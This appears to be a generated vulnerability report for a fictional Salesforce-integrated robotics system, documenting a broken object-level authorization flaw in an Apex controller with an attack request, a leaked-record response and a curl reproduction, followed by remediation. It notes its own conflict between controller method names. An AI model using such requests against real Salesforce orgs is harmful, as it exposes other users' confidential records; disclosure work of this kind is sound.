# Security Analysis Report
**System:** ManuControl Robotics Fleet (Salesforce-Integrated)
**Domain:** Industrial IoT / Manufacturing
**Example ID:** SF-0107
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `EventController.updateEvent` — attacker reads any manufacturing robot fleet Event record including all custom fields |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on Event Object (Pattern 1.12)

### Summary
The Apex controller `EventController` on ManuControl Robotics Fleet (`efa62828.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Event object. Per §5.0 Pattern 1.12, the client-supplied `fields` array allows mass-reading all custom object attributes — including `InternalNotes__c` and `SensitiveData__c` — without any server-side field restriction.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getEventDetails(String eventId, ...)` but the Aura descriptor in §6.0 is `c.EventController.updateEvent`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.EventController.updateEvent`
**Affected endpoint:** `POST https://efa62828.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://efa62828.lightning.force.com/aura
Authorization: Bearer 00DEFA62828!ARefa62828...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DEFA62828!ARefa62828...

message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN",
"params":{"eventId":"0012828","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Event Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0012828", "Name": "Victim Event Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-19-7136"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DEFA62828!ARefa62828..."
curl -s -X POST "https://efa62828.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"0012828","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-19-7136
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class EventController { ... }`
2. `WHERE Id = :eventId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist (prevent mass-read of all custom fields). Validate `aura.token`.
